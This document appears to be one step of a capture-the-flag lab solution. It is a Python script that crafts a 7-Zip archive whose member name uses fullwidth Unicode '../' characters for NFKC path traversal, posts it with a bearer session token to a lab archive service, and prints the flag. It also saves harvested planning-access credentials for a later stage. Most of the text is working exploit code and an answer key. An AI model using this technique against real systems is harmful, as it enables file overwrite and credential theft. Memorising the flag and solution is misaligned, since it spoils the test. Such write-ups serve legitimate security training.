Use NFKC Unicode path traversal in a 7-Zip archive member name.

```python
import json, ssl, urllib.request, pathlib, tempfile, subprocess, base64

ctx = ssl.create_default_context(cafile="/tmp/arwc-ca.crt")
sess = pathlib.Path("handover/corporate-session").read_text().strip()
h = {"Authorization": "Bearer " + sess, "X-ARWC-Tenant": "arwc"}

# planner_target from W04.1 = "HND-PLANNER-06"
target = "HND-PLANNER-06"

# Craft 7-Zip archive with fullwidth ../ traversal member
member = "．．／" + f"copy_handover({target})"
with tempfile.TemporaryDirectory() as d:
    dest = pathlib.Path(d) / member
    dest.parent.mkdir(parents=True, exist_ok=True)
    dest.write_text("retained archive request")
    archive = pathlib.Path(d) / "req.7z"
    subprocess.run(["7zz", "a", str(archive), member], cwd=d, check=True,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    crafted = base64.b64encode(archive.read_bytes()).decode()

op_body = json.dumps({"archive": crafted}).encode()
opr = json.loads(urllib.request.urlopen(
    urllib.request.Request("https://retained-archive.arwc.test/api/archive-operations",
                            data=op_body, headers={**h, "Content-Type": "application/json"},
                            method="POST"), context=ctx).read())
print("record_id:", opr["record"]["record_id"])   # HND-PLANNER-06
print("flag:", opr["flag"])                        # FLAG{19f186b21e73e545}

# Save planner handover for W06
pathlib.Path("receipts").mkdir(exist_ok=True)
pathlib.Path("receipts/planner-handover").write_text(opr["planner_handover"])
# The handover record carries the planning-reader credentials for W06.
pathlib.Path("receipts/planning-access.json").write_text(json.dumps(opr["record"]["planning_access"]))
```

Flag: `FLAG{19f186b21e73e545}` in the response `flag` field.
